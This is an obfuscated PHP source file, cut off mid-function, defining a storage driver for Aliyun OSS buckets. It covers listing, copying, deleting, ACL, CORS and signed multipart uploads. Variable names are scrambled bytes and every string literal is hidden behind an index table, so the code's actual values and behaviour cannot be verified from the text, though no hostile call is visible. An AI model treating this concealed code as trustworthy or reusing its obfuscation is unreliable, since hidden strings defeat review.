<?php
 goto Bä•ô´Ë³¯; BÊï”ºœ»: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($£ªæ³³ö) { parent::__construct(); include_once SDK_DIR . $_SERVER[‚ûòÉ˜ş][1408]; $this->_init($£ªæ³³ö); } public function _init($©ª•Ëºˆ) { $êğ½¦¸ =& $_SERVER[‚ûòÉ˜ş]; $this->config = $©ª•Ëºˆ; foreach ($©ª•Ëºˆ as $ºˆûüĞ„ => $¦¯ê¬õŞ) { if (isset($this->{$ºˆûüĞ„})) { $this->{$ºˆûüĞ„} = $¦¯ê¬õŞ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($êğ½¦¸[1409] . LNG($êğ½¦¸[1410])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $€«Ş‰ˆà =& $_SERVER[‚ûòÉ˜ş]; $ÂåÇÄĞà = new OSS\Model\CorsConfig(); $ÂÃò½ = new OSS\Model\CorsRule(); $ÂÃò½->addAllowedOrigin($€«Ş‰ˆà[1411]); $ÂÃò½->addAllowedMethod($€«Ş‰ˆà[1412]); $ÂÃò½->addAllowedMethod($€«Ş‰ˆà[1413]); $ÂÃò½->addAllowedMethod($€«Ş‰ˆà[1414]); $ÂÃò½->addAllowedMethod($€«Ş‰ˆà[1415]); $ÂÃò½->addAllowedMethod($€«Ş‰ˆà[171]); $ÂÃò½->setMaxAgeSeconds(600); $ÂÃò½->addExposeHeader($€«Ş‰ˆà[1416]); $ÂÃò½->addAllowedHeader($€«Ş‰ˆà[1411]); $ÂåÇÄĞà->addRule($ÂÃò½); try { $this->client->putBucketCors($this->bucket, $ÂåÇÄĞà); } catch (OSS\Core\OssException $¡ñ¯œ´) { return !1; } return !0; } public function getBucketCors() { $Æáó×ä =& $_SERVER[‚ûòÉ˜ş]; $Èó±š›÷ = null; try { $Èó±š›÷ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¡À¶™ÔÎ) { return null; } if (!$Èó±š›÷ || !($Ü¸´úé = $Èó±š›÷->getRules())) { return null; } $ìõÍ´ó = $Ü¸´úé[0]->getAllowedOrigins(); $’¤²“Ôş = $Ü¸´úé[0]->getAllowedMethods(); $ƒ¬‹Õ°« = $Ü¸´úé[0]->getMaxAgeSeconds(); $“İÂ˜ª¿ = $Ü¸´úé[0]->getExposeHeaders(); $„Á²¼Ã = $Ü¸´úé[0]->getAllowedHeaders(); return array($Æáó×ä[212] => isset($ìõÍ´ó[0]) ? $ìõÍ´ó[0] : $Æáó×ä[12], $Æáó×ä[216] => $’¤²“Ôş, $Æáó×ä[1417] => $ƒ¬‹Õ°«, $Æáó×ä[1418] => isset($“İÂ˜ª¿[0]) ? $“İÂ˜ª¿[0] : $Æáó×ä[12], $Æáó×ä[214] => isset($„Á²¼Ã[0]) ? $„Á²¼Ã[0] : $Æáó×ä[12]); } public function isBucketCors() { $â¹óÛ×® =& $_SERVER[‚ûòÉ˜ş]; $Ğ×§±¥¾ = $this->getBucketCors(); if (!$Ğ×§±¥¾ || !is_array($Ğ×§±¥¾)) { return !1; } if ($Ğ×§±¥¾[$â¹óÛ×®[212]] != $â¹óÛ×®[213] || $Ğ×§±¥¾[$â¹óÛ×®[214]] != $â¹óÛ×®[213]) { return !1; } $¦ÂêÜöœ = array_map($â¹óÛ×®[215], $Ğ×§±¥¾[$â¹óÛ×®[216]]); if (!is_array($¦ÂêÜöœ)) { $¦ÂêÜöœ = array(); } $ÊŞ«õ¿õ = array($â¹óÛ×®[217], $â¹óÛ×®[218], $â¹óÛ×®[219], $â¹óÛ×®[220], $â¹óÛ×®[221]); $¼Ä†Í™² = array_diff($ÊŞ«õ¿õ, $¦ÂêÜöœ); return empty($¼Ä†Í™²); } public function mkfile($Ú¢òÚã, $×óİÚŒş = '', $™‹òìÎ = REPEAT_RENAME) { $şêÌˆœÍ = $this->setContent($Ú¢òÚã, $×óİÚŒş); if ($şêÌˆœÍ !== !1) { return $this->getPathOuter($Ú¢òÚã); } return !1; } public function mkdir($í¡éÛ, $¢ÏÅ¦ÖÑ = REPEAT_SKIP) { if ($¢ÏÅ¦ÖÑ && $this->_isFolder($í¡éÛ)) { return $this->getPathOuter($í¡éÛ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($í¡éÛ)); } catch (OSS\Core\OssException $ç şíÇ) { return !1; } return $this->getPathOuter($í¡éÛ); } private function fileList($Şˆ°õ§™, $áÁ´µ· = '', $¸ê—åñù = 0) { $›¿ç£àÜ =& $_SERVER[‚ûòÉ˜ş]; $Şˆ°õ§™ = trim($Şˆ°õ§™, $›¿ç£àÜ[8]); $¤ÕË¯†¯ = empty($Şˆ°õ§™) && $Şˆ°õ§™ !== $›¿ç£àÜ[222] ? $›¿ç£àÜ[12] : $Şˆ°õ§™ . $›¿ç£àÜ[8]; $³÷ˆ¤ÍÖ = $›¿ç£àÜ[12]; $àç»æÔô = 1000; $ĞçÚç’¡ = $ò·Ç¼Ò = array(); while (!0) { check_abort(); $Âê—ÑŒÕ = array($›¿ç£àÜ[1419] => $áÁ´µ·, $›¿ç£àÜ[1420] => $¤ÕË¯†¯, $›¿ç£àÜ[1421] => $àç»æÔô, $›¿ç£àÜ[1422] => $³÷ˆ¤ÍÖ); try { $Óä´È¯Û = $this->client->listObjects($this->bucket, $Âê—ÑŒÕ); } catch (OSS\Core\OssException $ıƒáĞõ) { break; } $³÷ˆ¤ÍÖ = $Óä´È¯Û->getNextMarker(); $ŸÏ»îÈ× = $Óä´È¯Û->getObjectList(); $ÏûõÇà­ = $Óä´È¯Û->getPrefixList(); foreach ($ŸÏ»îÈ× as $•ş±óÀş) { if ($•ş±óÀş->getKey() == $¤ÕË¯†¯) { continue; } $Ê ûî•” = $•ş±óÀş->getKey(); $ØÃ®å§© = $•ş±óÀş->getSize(); $¢©Ùûıû = $•ş±óÀş->getLastModified(); $¬™İÀáÌ = trim($•ş±óÀş->getETag(), $›¿ç£àÜ[128]); $ŠÑë’öö = $¸ê—åñù ? array($›¿ç£àÜ[42] => $Ê ûî•”, $›¿ç£àÜ[86] => $ØÃ®å§©, $›¿ç£àÜ[204] => strtotime($¢©Ùûıû), $›¿ç£àÜ[1423] => $¬™İÀáÌ) : $Ê ûî•”; $õô“–§œ = $ØÃ®å§© == 0 && substr($Ê ûî•”, strlen($Ê ûî•”) - 1, 1) == $›¿ç£àÜ[8] ? !0 : !1; $™€Œ¾Ë = array($›¿ç£àÜ[86] => $ØÃ®å§©, $›¿ç£àÜ[1424] => $ØÃ®å§©, $›¿ç£àÜ[95] => strtotime($¢©Ùûıû), $›¿ç£àÜ[1425] => $¢©Ùûıû, $›¿ç£àÜ[1423] => $¬™İÀáÌ); $this->cacheMethodInfoSet($Ê ûî•”, $õô“–§œ, $™€Œ¾Ë); if ($õô“–§œ) { $ĞçÚç’¡[] = $Ê ûî•”; continue; } $ò·Ç¼Ò[] = $ŠÑë’öö; } foreach ($ÏûõÇà­ as $«»ÍÜŠ‘) { $ĞçÚç’¡[] = $«»ÍÜŠ‘->getPrefix(); $this->cacheMethodInfoSet($«»ÍÜŠ‘->getPrefix(), !0); } if ($³÷ˆ¤ÍÖ === $›¿ç£àÜ[12]) { break; } } $this->cacheMethodInfoSet($Şˆ°õ§™, !0); return array($›¿ç£àÜ[92] => $ĞçÚç’¡, $›¿ç£àÜ[93] => $ò·Ç¼Ò); } public function copyFile($Ù×¬¯»Ù, $º±å¦ã) { $ì‰ÁÎı = $this->size($Ù×¬¯»Ù); if ($ì‰ÁÎı < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ù×¬¯»Ù, $this->bucket, $this->pathEncode($º±å¦ã)); } catch (OSS\Core\OssException $ãèí²ß) { return !1; } return $this->getPathOuter($º±å¦ã); } $Ø‘²å• = $this->multiCopyObject($Ù×¬¯»Ù, $º±å¦ã, $ì‰ÁÎı); return $Ø‘²å• ? $this->getPathOuter($º±å¦ã) : !1; } private function multiCopyObject($°…ŸÃÌÊ, $Á­ïùÚ™, $£¸«ºµ¶) { $¶†ŸÑëş =& $_SERVER[‚ûòÉ˜ş]; try { $ï¼ë†‰Ó = array(); if ($ğªÕ×½ø = $this->hashMd5($°…ŸÃÌÊ)) { $ï¼ë†‰Ó = array(OSS\OssClient::OSS_HEADERS => array($¶†ŸÑëş[1426] => $ğªÕ×½ø)); } $àÚ†»¨ó = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Á­ïùÚ™), $ï¼ë†‰Ó); $µ˜‘ëøû = 1; $È™‹Ü¡« = 0; $Ê€ØÍ©‰ = array(); $™Í¬®Ü¯ = 1024 * 1024 * 10; $¤éŒ¾Ã = $this->client->generateMultiuploadParts($£¸«ºµ¶, $™Í¬®Ü¯); foreach ($¤éŒ¾Ã as $Ùª¦¤Ì => $«Œó„ïÆ) { $ëÚ‹ÀÁÅ = $È™‹Ü¡« + (int) $«Œó„ïÆ[$¶†ŸÑëş[1427]]; $ƒÓ¾ªŠš = (int) $«Œó„ïÆ[$¶†ŸÑëş[390]] + $ëÚ‹ÀÁÅ - 1; $éÙ«ÉßÃ = array($¶†ŸÑëş[1428] => $ëÚ‹ÀÁÅ, $¶†ŸÑëş[1429] => $ƒÓ¾ªŠš); $Ê€ØÍ©‰[] = $this->client->uploadPartCopy($this->bucket, $°…ŸÃÌÊ, $this->bucket, $this->pathEncode($Á­ïùÚ™), $µ˜‘ëøû, $àÚ†»¨ó, $éÙ«ÉßÃ); $µ˜‘ëøû = $µ˜‘ëøû + 1; } $§ëèƒù = array(); foreach ($Ê€ØÍ©‰ as $Ùª¦¤Ì => $×Œ—ö¿) { $§ëèƒù[] = array($¶†ŸÑëş[1430] => $Ùª¦¤Ì + 1, $¶†ŸÑëş[1431] => $×Œ—ö¿); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Á­ïùÚ™), $àÚ†»¨ó, $§ëèƒù); } catch (OSS\Core\OssException $ğöÁ°İ²) { return !1; } return !0; } public function moveFile($ÙµÌ¹”£, $èó¨¾òë) { if ($this->copyFile($ÙµÌ¹”£, $èó¨¾òë)) { $this->remove($ÙµÌ¹”£); return $this->getPathOuter($èó¨¾òë); } return !1; } public function delFile($ş¿áÀÓ´) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ş¿áÀÓ´)); } catch (OSS\Core\OssException $ĞïÌæ™å) { return !1; } return !0; } public function delFolder($ã°ó¸Ş—) { $©™á‡ÊÀ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->exist($ã°ó¸Ş—)) { return !0; } $this->listItemCache = !1; $ğéÖ­›Ğ = $this->fileList($ã°ó¸Ş—); $this->listItemCache = !0; $Ùó´óˆë = trim($ã°ó¸Ş—, $©™á‡ÊÀ[8]) . $©™á‡ÊÀ[8]; if (!empty($ã°ó¸Ş—) && $ã°ó¸Ş— !== $©™á‡ÊÀ[222] && !in_array($Ùó´óˆë, $ğéÖ­›Ğ[$©™á‡ÊÀ[92]])) { $ğéÖ­›Ğ[$©™á‡ÊÀ[92]][] = $Ùó´óˆë; } $­ø†£Ò = $this->delByBatch($ğéÖ­›Ğ[$©™á‡ÊÀ[93]]); if (!$­ø†£Ò) { return !1; } $­ø†£Ò = $this->delByBatch($ğéÖ­›Ğ[$©™á‡ÊÀ[92]]); if (!$­ø†£Ò) { return !1; } return $this->delFile($Ùó´óˆë); } private function delByBatch($×§‹œ´²) { foreach (array_chunk($×§‹œ´², 1000) as $«â”ø²Û) { try { $this->client->deleteObjects($this->bucket, $«â”ø²Û); } catch (OSS\Core\OssException $¡óĞ­ôÎ) { return !1; } } return !0; } public function rename($Ô•Ì±Ñá, $¡–›ãÃØ) { return $this->renameObject($Ô•Ì±Ñá, $¡–›ãÃØ); } private function fileInfo($ÔÉæ’è‰, $àİ…†ÇÈ = false, $—­€†×¨ = array()) { $ç•ğú¢Ö =& $_SERVER[‚ûòÉ˜ş]; $ ·î¶Œ = array($ç•ğú¢Ö[42] => $this->pathThis($ÔÉæ’è‰), $ç•ğú¢Ö[94] => $this->getPathOuter($ÔÉæ’è‰), $ç•ğú¢Ö[43] => $ç•ğú¢Ö[224], $ç•ğú¢Ö[86] => isset($—­€†×¨[$ç•ğú¢Ö[86]]) ? $—­€†×¨[$ç•ğú¢Ö[86]] : 0, $ç•ğú¢Ö[185] => $this->ext($ÔÉæ’è‰)); if ($àİ…†ÇÈ) { return $ ·î¶Œ; } $ ·î¶Œ[$ç•ğú¢Ö[225]] = $ ·î¶Œ[$ç•ğú¢Ö[95]] = 0; $ ·î¶Œ[$ç•ğú¢Ö[226]] = $ ·î¶Œ[$ç•ğú¢Ö[227]] = !0; if (empty($—­€†×¨)) { $¢½•×‘ = $this->objectMeta($ÔÉæ’è‰); if (!$¢½•×‘) { return $ ·î¶Œ; } $—­€†×¨ = array($ç•ğú¢Ö[95] => strtotime($¢½•×‘[$ç•ğú¢Ö[1425]]), $ç•ğú¢Ö[86] => $¢½•×‘[$ç•ğú¢Ö[1424]] + 0, $ç•ğú¢Ö[1423] => $¢½•×‘[$ç•ğú¢Ö[1423]]); } if (isset($—­€†×¨[$ç•ğú¢Ö[1423]]) && $—­€†×¨[$ç•ğú¢Ö[1423]]) { $ ·î¶Œ[$ç•ğú¢Ö[229]] = trim($—­€†×¨[$ç•ğú¢Ö[1423]], $ç•ğú¢Ö[128]); } if (isset($—­€†×¨[$ç•ğú¢Ö[86]])) { $ ·î¶Œ[$ç•ğú¢Ö[86]] = $—­€†×¨[$ç•ğú¢Ö[86]]; } if (isset($—­€†×¨[$ç•ğú¢Ö[95]])) { $ ·î¶Œ[$ç•ğú¢Ö[95]] = $—­€†×¨[$ç•ğú¢Ö[95]]; } if (isset($—­€†×¨[$ç•ğú¢Ö[204]]) && !trim($ ·î¶Œ[$ç•ğú¢Ö[95]])) { $ ·î¶Œ[$ç•ğú¢Ö[95]] = $—­€†×¨[$ç•ğú¢Ö[204]]; } return $ ·î¶Œ; } private function folderInfo($œñª™, $Å›½Ú®€ = false, $çç–´æ‹ = array()) { $­†°äÍ =& $_SERVER[‚ûòÉ˜ş]; $ìå¢Íä = array($­†°äÍ[42] => $this->pathThis($œñª™), $­†°äÍ[94] => $this->getPathOuter($­†°äÍ[8] . $œñª™), $­†°äÍ[43] => $­†°äÍ[85]); if ($Å›½Ú®€) { return $ìå¢Íä; } $ìå¢Íä[$­†°äÍ[225]] = $ìå¢Íä[$­†°äÍ[95]] = 0; $ìå¢Íä[$­†°äÍ[226]] = $ìå¢Íä[$­†°äÍ[227]] = !0; if (empty($çç–´æ‹)) { $œñª™ = rtrim($œñª™, $­†°äÍ[8]) . $­†°äÍ[8]; $ª¶Ü·òñ = $this->objectMeta($œñª™); if (!$ª¶Ü·òñ) { return $ìå¢Íä; } $çç–´æ‹ = array($­†°äÍ[225] => $ª¶Ü·òñ[$­†°äÍ[552]][$­†°äÍ[1432]], $­†°äÍ[95] => strtotime($ª¶Ü·òñ[$­†°äÍ[1425]])); } if (isset($çç–´æ‹[$­†°äÍ[95]])) { $ìå¢Íä[$­†°äÍ[95]] = $çç–´æ‹[$­†°äÍ[95]]; } if (isset($çç–´æ‹[$­†°äÍ[225]])) { $ìå¢Íä[$­†°äÍ[225]] = $çç–´æ‹[$­†°äÍ[225]]; } return $ìå¢Íä; } public function listPath($åˆŞ¬È”, $èï±­•¬ = false) { $Ê¡®çı‰ =& $_SERVER[‚ûòÉ˜ş]; $’ÍÄøÇÜ = $this->fileList($åˆŞ¬È”, $Ê¡®çı‰[8], !0); foreach ($’ÍÄøÇÜ[$Ê¡®çı‰[92]] as $À–â‘Ñˆ => $„µÒ˜­ı) { $’ÍÄøÇÜ[$Ê¡®çı‰[92]][$À–â‘Ñˆ] = $this->folderInfo($„µÒ˜­ı, $èï±­•¬, $„µÒ˜­ı); } foreach ($’ÍÄøÇÜ[$Ê¡®çı‰[93]] as $À–â‘Ñˆ => $„µÒ˜­ı) { $’ÍÄøÇÜ[$Ê¡®çı‰[93]][$À–â‘Ñˆ] = $this->fileInfo($„µÒ˜­ı[$Ê¡®çı‰[42]], $èï±­•¬, $„µÒ˜­ı); } return $’ÍÄøÇÜ; } protected function infoChildren($ÈÎ„ÕõÂ, &$èÛ†Ğƒ£) { $Ş„ß°û÷ =& $_SERVER[‚ûòÉ˜ş]; $ç¢éÄÕµ = $this->fileList($ÈÎ„ÕõÂ, $Ş„ß°û÷[12], !0); $èÛ†Ğƒ£[$Ş„ß°û÷[88]] += count($ç¢éÄÕµ[$Ş„ß°û÷[92]]); $èÛ†Ğƒ£[$Ş„ß°û÷[87]] += count($ç¢éÄÕµ[$Ş„ß°û÷[93]]); foreach ($ç¢éÄÕµ[$Ş„ß°û÷[93]] as $´¹µÉÁ) { if (!$´¹µÉÁ || !$´¹µÉÁ[$Ş„ß°û÷[86]]) { continue; } $èÛ†Ğƒ£[$Ş„ß°û÷[86]] += $´¹µÉÁ[$Ş„ß°û÷[86]]; } } public function has($‘ ­ÙÌ, $ŞªÉÑÜ¶ = false, $Œçû›ôƒ = true) { $ã¬†“À¡ =& $_SERVER[‚ûòÉ˜ş]; $‘ ­ÙÌ = trim($‘ ­ÙÌ, $ã¬†“À¡[8]); $È‡½â¦ = empty($‘ ­ÙÌ) && $‘ ­ÙÌ !== $ã¬†“À¡[222] ? $ã¬†“À¡[12] : $‘ ­ÙÌ . $ã¬†“À¡[8]; $«à¾Ïô = $ã¬†“À¡[12]; $àÍ’Ù¤“ = 500; $ŒÉÓØãÅ = $ŒõØ“ÇÅ = 0; while (!0) { check_abort(); $¥Âæ›½ = array($ã¬†“À¡[1419] => $ã¬†“À¡[8], $ã¬†“À¡[1420] => $È‡½â¦, $ã¬†“À¡[1421] => $àÍ’Ù¤“, $ã¬†“À¡[1422] => $«à¾Ïô); try { $Ÿ¯«ÔÜ = $this->client->listObjects($this->bucket, $¥Âæ›½); } catch (OSS\Core\OssException $ëùÀ†¿Ç) { break; } $«à¾Ïô = $Ÿ¯«ÔÜ->getNextMarker(); $ÂõÚØ‹ = $Ÿ¯«ÔÜ->getObjectList(); $‡ã–ˆ½‚ = $Ÿ¯«ÔÜ->getPrefixList(); if ($ŞªÉÑÜ¶) { if (count($ÂõÚØ‹) > 1 || count($ÂõÚØ‹) == 1 && $ÂõÚØ‹[0]->getKey() != $È‡½â¦) { $ŒÉÓØãÅ += count($ÂõÚØ‹) - 1; } if (!empty($‡ã–ˆ½‚)) { $ŒõØ“ÇÅ += count($‡ã–ˆ½‚); } if ($«à¾Ïô === $ã¬†“À¡[12]) { break; } continue; } if ($Œçû›ôƒ) { if (!empty($ÂõÚØ‹)) { if (count($ÂõÚØ‹) > 1 || $ÂõÚØ‹[0]->getKey() != $È‡½â¦) { return !0; } } } else { if (!empty($‡ã–ˆ½‚)) { return !0; } } if ($«à¾Ïô === $ã¬†“À¡[12]) { break; } } if ($ŞªÉÑÜ¶) { return array($ã¬†“À¡[233] => $ŒÉÓØãÅ, $ã¬†“À¡[234] => $ŒõØ“ÇÅ); } return !1; } public function listAll($Õº¯‹Ò¢) { $„¡¦Ã¦ =& $_SERVER[‚ûòÉ˜ş]; $Ø‹ß Ó• = $this->fileList($Õº¯‹Ò¢, $„¡¦Ã¦[12], !0); $ºÑ²–¨ = array_to_keyvalue($Ø‹ß Ó•[$„¡¦Ã¦[93]], $„¡¦Ã¦[42]); foreach ($Ø‹ß Ó•[$„¡¦Ã¦[92]] as $ÕˆÛûº‘) { if (is_string($ÕˆÛûº‘)) { $ºÑ²–¨[$ÕˆÛûº‘] = array($„¡¦Ã¦[86] => 0); } } return $this->listAllFiles($Õº¯‹Ò¢, $ºÑ²–¨); } public function canRead($òÊÅş¦ö) { $£“Óâ¶– =& $_SERVER[‚ûòÉ˜ş]; $ø…ï¦à± = $this->pathAcl($òÊÅş¦ö); return $ø…ï¦à± == $£“Óâ¶–[1433] || $ø…ï¦à± == $£“Óâ¶–[595] ? !0 : !1; } public function canWrite($¹÷Ü‡®) { $¶Œ©’µé = $this->pathAcl($¹÷Ü‡®); return $¶Œ©’µé == $_SERVER[‚ûòÉ˜ş][595] ? !0 : !1; } public function pathAcl($ë’ó’Ëá) { $¬ÖŒıÇ =& $_SERVER[‚ûòÉ˜ş]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $â¦şì‰´ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ë’ó’Ëá)); } catch (OSS\Core\OssException $ë¾Ç†Ë) { return !1; } $èóÜ¿‰ö = $â¦şì‰´ == $¬ÖŒıÇ[47] ? $this->bucketAcl : $â¦şì‰´; if ($èóÜ¿‰ö == $¬ÖŒıÇ[1434]) { return $¬ÖŒıÇ[1433]; } if ($èóÜ¿‰ö == $¬ÖŒıÇ[1435]) { return $¬ÖŒıÇ[595]; } return $èóÜ¿‰ö; } private function chmodPath($å˜‹’ÔŸ, $ÄÕ¿ìÆó = '') { $¦ÍŞ”Â =& $_SERVER[‚ûòÉ˜ş]; $ÏÊÄğ×º = empty($ÄÕ¿ìÆó) ? $¦ÍŞ”Â[1435] : $ÄÕ¿ìÆó; $Ïôæ˜ = array($¦ÍŞ”Â[47], $¦ÍŞ”Â[223], $¦ÍŞ”Â[1434], $¦ÍŞ”Â[1435]); if (!in_array($ÏÊÄğ×º, $Ïôæ˜)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($å˜‹’ÔŸ), $ÏÊÄğ×º); } catch (OSS\Core\OssException $şŒßë€Š) { return !1; } return !0; } public function getContent($À¹ĞšûÃ) { return $this->fileSubstr($À¹ĞšûÃ, -1); } public function setContent($§ì¼£¯À, $ú«İÉ = '') { $†—…³Íù =& $_SERVER[‚ûòÉ˜ş]; try { $Ë€–ñ¦ = $this->trafficLimit($†—…³Íù[1436]); $ä²ƒË½ = $this->client->putObject($this->bucket, $this->pathEncode($§ì¼£¯À), $ú«İÉ, $Ë€–ñ¦); } catch (OSS\Core\OssException $¤òÇºûİ) { return !1; } $Ø“±•»› = array($†—…³Íù[1426] => trim($ä²ƒË½[$†—…³Íù[1423]], $†—…³Íù[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($§ì¼£¯À))); $this->updateObjMeta($§ì¼£¯À, $Ø“±•»›); return isset($ä²ƒË½[$†—…³Íù[1437]][$†—…³Íù[284]]) ? !0 : !1; } private function updateObjMeta($´ØüÊ‹Ç, $Î¼Õ¨­¿) { $´ØüÊ‹Ç = $this->pathEncode($´ØüÊ‹Ç); try { $íÓ¼×í¿ = array(OSS\OssClient::OSS_HEADERS => $Î¼Õ¨­¿); $this->client->copyObject($this->bucket, $´ØüÊ‹Ç, $this->bucket, $´ØüÊ‹Ç, $íÓ¼×í¿); } catch (OSS\Core\OssException $ÑÍ›œ‰³) { return !1; } return !0; } public function upload($Öš¤¿¿´, $ÙÇ•Ç¤ı, $Š—¥€ï = false, $šÌÇâ—  = REPEAT_REPLACE) { $Â„â–ÖŒ =& $_SERVER[‚ûòÉ˜ş]; $ˆİ­¶ŸÍ = trim($Öš¤¿¿´, $Â„â–ÖŒ[8]); $•¯è¨àÑ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Â„â–ÖŒ[1426] => @md5_file($ÙÇ•Ç¤ı)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Öš¤¿¿´))); $•¯è¨àÑ = $this->trafficLimit($Â„â–ÖŒ[1436], $•¯è¨àÑ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ˆİ­¶ŸÍ), $ÙÇ•Ç¤ı, $•¯è¨àÑ); } catch (OSS\Core\OssException $İàËÆ‡) { return !1; } return $this->getPathOuter($Öš¤¿¿´); } public function getHost() { $îÓ»º§¾ =& $_SERVER[‚ûòÉ˜ş]; $‚©µøøª = explode($îÓ»º§¾[208], parent::getHost()); return $‚©µøøª[0] . $îÓ»º§¾[208] . $this->bucket . $îÓ»º§¾[10] . $‚©µøøª[1]; } public function uploadFormData($Ìö¿­ëÎ, $÷¤á€Şõ = 3600) { $ó“Œî¨ =& $_SERVER[‚ûòÉ˜ş]; if (!($ìÅ¶§€´ = $this->getHost())) { return !1; } $‹äÚÎô¢ = $÷¤á€Şõ; $à°Æº = date($ó“Œî¨[1438], time() + $‹äÚÎô¢); $‡—ÕÒ´ = new DateTime($à°Æº); $¢›ş°İ‡ = $‡—ÕÒ´->format(DateTime::ISO8601); $½åÄ»Š = strpos($¢›ş°İ‡, $ó“Œî¨[349]); $¢›ş°İ‡ = substr($¢›ş°İ‡, 0, $½åÄ»Š) . $ó“Œî¨[1439]; $éËÜ = 1048576000 * 5; $¦Êíß‘ã = $this->pathFather($Ìö¿­ëÎ); $‰‘—…Ìµ = array($ó“Œî¨[267] => $¢›ş°İ‡, $ó“Œî¨[270] => array(array($ó“Œî¨[1440], 0, $éËÜ), array($ó“Œî¨[273], $ó“Œî¨[274], $¦Êíß‘ã))); $³Ñ¦Üë = base64_encode(json_encode($‰‘—…Ìµ)); $‰ªğ°İŠ = base64_encode(hash_hmac($ó“Œî¨[256], $³Ñ¦Üë, $this->secret, !0)); $ş­±Îä = array($ó“Œî¨[285] => $³Ñ¦Üë, $ó“Œî¨[1441] => $this->accessKey, $ó“Œî¨[277] => $ó“Œî¨[266], $ó“Œî¨[1442] => $‰ªğ°İŠ, $ó“Œî¨[206] => $ìÅ¶§€´); $ş­±Îä = $this->trafficLimit($ó“Œî¨[1436], $ş­±Îä); return $ş­±Îä; } public function multiUploadFormData($æ†èÏßš, $¨óªİˆ• = 3600) { $Íæö·”¨ =& $_SERVER[‚ûòÉ˜ş]; if (!($öõïèáú = $this->getHost())) { return !1; } $öÕÙƒşÕ = $this->trafficLimit($Íæö·”¨[1436]); $àš’æ²Ê = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($æ†èÏßš), $öÕÙƒşÕ); return array($Íæö·”¨[248] => $àš’æ²Ê, $Íæö·”¨[206] => $öõïèáú . $Íæö·”¨[8] . $this->pathEncode($æ†èÏßš), $Íæö·”¨[249] => gmdate($Íæö·”¨[1443]), $Íæö·”¨[104] => $æ†èÏßš); } public function multiUploadAuthData($Å¤¢£ƒ, $äçâèÙ = array()) { $öœŸ„ş… =& $_SERVER[‚ûòÉ˜ş]; $á¿«¼ŸÌ = isset($äçâèÙ[$öœŸ„ş…[249]]) ? $äçâèÙ[$öœŸ„ş…[249]] : gmdate($öœŸ„ş…[1443]); $®Ê¡¶¥± = isset($äçâèÙ[$öœŸ„ş…[185]]) ? $äçâèÙ[$öœŸ„ş…[185]] : $öœŸ„ş…[12]; $ƒ¨³²á™ = $Å¤¢£ƒ; if (isset($äçâèÙ[$öœŸ„ş…[104]])) { $ƒ¨³²á™ = $äçâèÙ[$öœŸ„ş…[104]]; unset($äçâèÙ[$öœŸ„ş…[104]]); } if (isset($äçâèÙ[$öœŸ„ş…[250]])) { $äçâèÙ[$öœŸ„ş…[249]] = $á¿«¼ŸÌ; return $this->listUploadParts($ƒ¨³²á™, $äçâèÙ); } $„‚ãÌÙ = array($öœŸ„ş…[251], $öœŸ„ş…[12], $öœŸ„ş…[130], $á¿«¼ŸÌ, "\x78\55\x6f\x73\163\x2d\144\141\164\x65\x3a{$á¿«¼ŸÌ}", $öœŸ„ş…[8] . $this->bucket . $öœŸ„ş…[8] . $ƒ¨³²á™ . $®Ê¡¶¥±); if (strpos($®Ê¡¶¥±, $öœŸ„ş…[252]) === 0) { $„‚ãÌÙ[0] = $öœŸ„ş…[253]; if ($¯é…Ó¶ø = $this->trafficLimit($öœŸ„ş…[1436])) { $ƒ¨³²á™ = $öœŸ„ş…[1444]; array_splice($„‚ãÌÙ, 5, 0, $ƒ¨³²á™ . $öœŸ„ş…[4] . $¯é…Ó¶ø[$ƒ¨³²á™]); } } if (isset($äçâèÙ[$öœŸ„ş…[254]]) && $äçâèÙ[$öœŸ„ş…[254]] == $öœŸ„ş…[255]) { $„‚ãÌÙ[0] = $öœŸ„ş…[255]; } if (!empty($äçâèÙ[$öœŸ„ş…[1445]])) { $Ÿ…¯†×² = array_merge(array($„‚ãÌÙ[4]), $äçâèÙ[$öœŸ„ş…[1445]]); sort($Ÿ…¯†×²); $„‚ãÌÙ[4] = implode($öœŸ„ş…[18], $Ÿ…¯†×²); } $Óûáú—Ó = implode($öœŸ„ş…[18], $„‚ãÌÙ); $™Ö½×ùŒ = base64_encode(hash_hmac($öœŸ„ş…[256], $Óûáú—Ó, $this->secret, !0)); $…ÇÒÖÒÈ = $öœŸ„ş…[1409] . $this->accessKey . $öœŸ„ş…[4] . $™Ö½×ùŒ; if (strpos($®Ê¡¶¥±, $öœŸ„ş…[252]) === 0) { $…ÇÒÖÒÈ = array($öœŸ„ş…[258] => $…ÇÒÖÒÈ, $öœŸ„ş…[249] => $á¿«¼ŸÌ); if ($¯é…Ó¶ø) { $…ÇÒÖÒÈ = array_merge($…ÇÒÖÒÈ, $¯é…Ó¶ø); } } return $…ÇÒÖÒÈ; } public function listUploadParts($æµ‘œ«ì, $ ş¥¡ä¦) { $÷»à€¥Î =& $_SERVER[‚ûòÉ˜ş]; $øé²÷â = parse_url_query($ ş¥¡ä¦[$÷»à€¥Î[185]]); $Şà¬åè = $this->client->listParts($this->bucket, $this->pathEncode($æµ‘œ«ì), $øé²÷â[$÷»à€¥Î[248]]); 